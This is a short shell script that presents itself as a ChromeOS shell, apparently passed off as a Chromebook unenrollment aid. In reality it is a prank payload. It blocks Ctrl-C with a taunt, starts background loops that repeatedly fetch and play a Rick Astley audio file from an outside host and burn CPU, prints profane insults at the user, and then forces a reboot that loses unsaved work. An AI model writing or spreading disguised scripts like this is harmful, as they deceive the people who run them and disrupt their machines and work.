# This is most definitely a fucking ChromeOS shell
    
    trap 'echo "You cannot escape you skid!!"' SIGINT
    clear

    # the following code belongs to Luphoria (aka Trent) until the other comment says otherwise
    while [ 1=1 ]; do
        aplay <(curl https://micspam.dazzozo.com/Sakura/Audio/Old%20Music/Never%20Gonna%20Give%20You%20Up%20-%20Rick%20Astley.wav) | echo > /dev/null
    done & disown &
    while [ 1=1 ];
    do
        echo e > /dev/null
        #amixer set Master 100% unmute | echo > /dev/null
    done & disown
    # the rest of the code is mine
    sleep 1
    echo "How fucking stupid are you? This WILL NOT WORK in the ChromeOS shell."
    sleep 3
    echo "Imagine actually running this in a chromeos shell because you think it can aid you in unenrolling your"
    echo "fucking chromebook or some other shit."
    sleep 3
    echo "If you are complaining, I could have done worse and made it fucking delete everything, which would require a recovery. "
    sleep 3
    echo "Be glad I didn't."
    sleep 3
    echo "Now, I hope you don't have any unsaved work!"
    echo "You cannot get you out of this one!"
    sleep 204000
    reboot
